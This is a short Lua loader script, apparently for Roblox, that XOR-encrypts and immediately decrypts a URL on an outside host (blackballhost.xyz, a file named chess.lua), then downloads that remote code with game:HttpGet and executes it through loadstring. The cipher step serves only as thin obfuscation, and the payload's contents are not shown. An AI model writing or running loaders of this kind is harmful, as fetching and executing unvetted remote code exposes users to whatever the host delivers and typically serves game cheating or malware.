local string = "https://blackballhost.xyz/s/chess.lua"
local cipher_key = "8@aC!xoXj!cemnnHjyLW!@wtr_D8r9*9-h9r6NnZ4AJGjVNWbY"

local function encrypt(str, key)
local encrypted = ""
for i = 1, #str do
  local char = string.byte(str, i)
  local key_char = string.byte(key, (i - 1) % #key + 1)
  encrypted = encrypted .. string.char(bit32.bxor(char, key_char))
end
return encrypted
end

local function decrypt(str, key)
return encrypt(str, key)
end

local encrypted = encrypt(string, cipher_key)

loadstring(game:HttpGet(decrypt(encrypted, cipher_key)))()